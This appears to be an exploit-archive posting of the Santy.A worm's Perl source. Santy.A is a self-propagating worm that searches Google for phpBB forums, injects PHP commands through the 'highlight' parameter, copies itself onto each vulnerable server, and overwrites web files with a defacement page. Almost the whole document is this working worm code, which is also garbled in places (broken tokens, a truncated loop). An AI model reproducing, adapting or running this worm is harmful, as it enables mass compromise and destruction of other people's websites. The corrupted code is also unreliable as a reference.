phpBB highlight Arbitrary File Upload (Santy.A)
===============================================






#
# Santy.A - phpBB <= 2.0.10 Web Worm Source Code (Proof of Concept)
# -SECU For educational purpose
#
# See : http://isc.sans.org/diary.php?date=2004-12-21
# http://www.f-secure.com/v-descs/santy_a.shtml
#
#!/usr/bin/perl
use
strict;
use Socket;

sub PayLoad();
sub DoDir($);
sub DoFile ($);
sub GoGoogle();

sub GrabURL($);
sub str2chr($);

eval{ fork and exit; };

my $generation = x;
PayLoad() if $generation > 3;

open IN, $0 or exit;
my $self = join &#039;&#039;, <IN>;
close IN;
unlink $0;

while(!GrabURL(&#039;http://www.google.com/advanced_search&#039;)) {
if($generation > 3)
{
PayLoad() ;
} else {
exit;
}
}

$self =~ s/my \$generation = (\d+);/&#039;my $generation = &#039; . ($1 + 1) . &#039;;&#039;/e;

my $selfFileName = &#039;m1ho2of&#039;;
my $markStr = &#039;HYv9po4z3jjHWanN&#039;;
my $perlOpen = &#039;perl -e "open OUT,q(>&#039; . $selfFileName . &#039;) and print q(&#039; . $markStr . &#039;)"&#039;;
my $tryCode = &#039;&highlight=%2527%252Esystem(&#039; . str2chr($perlOpen) . &#039;)%252e%2527&#039;;

while(1) {
exit if -e &#039;stop.it&#039;;

OUTER: for my $url (GoGoogle()) {

exit if -e &#039;stop.it&#039;;

$url =~ s/&highlight=.*$//;
$url .= $tryCode;
my $r = GrabURL($url);
next unless defined $r;
next unless $r =~ /$markStr/;

while($self =~ /(.{1,20})/gs) {
my $portion = &#039;&highlight=%2527%252Efwrite(fopen(&#039; . str2chr($selfFileName) . &#039;,&#039; . str2chr(&#039;a&#039;) . &#039;),
&#039; . str2chr($1) . &#039;),exit%252e%2527&#039;;

$url =~ s/&highlight=.*$//;
$url .= $portion;

next OUTER unless GrabURL($url);
}

my $syst = &#039;&highlight=%2527%252Esystem(&#039; . str2chr(&#039;perl &#039; . $selfFileName) . &#039;)%252e%2527&#039;;
$url =~ s/&highlight=.*$//;
$url .= $syst;

GrabURL($url);
}
}



sub str2chr($) {
my $s = shift;

$s =~ s/(.)/&#039;chr(&#039; . or d($1) . &#039;)%252e&#039;/seg;
$s =~ s/%252e$//;

return $s;
}


sub GoGoogle() {
my @urls;
my @ts = qw/t p topic/;
my $startURL = &#039;http://www.google.com/search?num=100&hl=en&lr=&as_qdr=all&#039; . &#039;&
q=allinurl%3A+%22viewtopic.php%22+%22&#039; . $ts[int(rand(@ts))] . &#039;%3D&#039; . int(rand(30000)) .
&#039;%22&btnG=Search&#039;;
my $goo1st = GrabURL($startURL)
fined $goo1st;
my $allGoo = $goo1st;
my $r = &#039;<td><a href=(/search\?q=.+?)&#039; . &#039;><img src=/nav_page\.gif width=16 height=26
alt="" border=0><br>\d+</a>&#039;;
while($goo1st =~ m#$r#g) {
$allGoo . = GrabURL(&#039;www.google.com&#039; . $1);
}
while($allGoo =~ m#href=(http://\S+viewtopic.php\S+)#g) {
my $u = $1;
next if $u =~ m#http://.*http://#i; # no redirects
push(@urls, $u);
}

return @urls;
}


sub GrabURL($) {
my $url = shift;
$url =~ s#^http://##i;

my ($host, $res) = $url =~ m#^(.+?)(/.*)#;
return unless defined($host) && defined($res);

my $r =
"GET $resHTTP/1.0\015\012" .
"Host: $host\015\012" .
"Accept:*/*\015\012" .
"Accept-Language: en-us,en-gb;q=0.7,en;q=0.3\015\012" .
"Pragma: no-cache\015\012" .
"Cache-Control: no-cache\015\012" .
"Referer: http://" . $host . $res . "\015\012" .

"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\015\012" .
"Connection: close\015\012\015\012";

my $port = 80;
if($host =~ /(.*):(\d+)$/){ $host = $1; $port = $2;}

my $internet_addr = inet_aton($host) or return;
socket(Server, PF_INET, SOCK_STREAM, getprotobyname(&#039;tcp&#039;)) or return;
setsockopt(Server, SOL_SOCKET, SO_RCVTIMEO, 10000);

connect(Server, sockaddr_in($port, $internet_addr)) or return;
select((select(Server), $| = 1)[0]);
print Server $r;

my $answer = join &#039;&#039;, <Server>;
close (Server);

return $answer;
}


sub DoFile($) {
my $s = q{
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<HTML><HEAD><TITLE>This site is defaced!!!</TITLE></HEAD>
<BODY bgcolor="#000000" text="#FF0000">
<H1>This site is defaced!!!</H1>
<HR><ADDRESS><b>NeverEverNoSanity WebWorm generation }
. $generation .q{.</b></ADDRESS>
</BODY></HTML>
};

unlink $_[0];
open OUT, ">$_[0]" or return;
print OUT $s;
close OUT;
}


sub DoDir($) {

my $dir = $_[0];
$dir .= &#039;/&#039; unless $dir =~ m#/$#;

local *DIR;
opendir DIR, $dir or return;

for my $ent (grep { $_ ne &#039;.&#039; and $_ ne &#039;..&#039; } readdir DIR) {

unless(-l $dir . $ent) {
if(-d _) {
DoDir($dir . $ent);
next;
}
}

if($ent =~ /\.htm/i or $ent =~ /\.php/i or $ent =~ /\.asp/i or $ent =~ /\.shtm/i or $ent =~ /\.jsp/i
or $ent =~ /\.phtm/i) {
DoFile($dir . $ent);
}
}

closedir DIR;
}


sub Pay Load() {

my @dirs;


eval{
while(my @a = getpwent()) { push(@dirs, $a[7]);}
};

push(@dirs, &#039;/ &#039;);

for my $l (&#039;A&#039; .. &#039;Z&#039;) {
push(@d
for my $d (@dirs) {
DoDir($d);
}
}



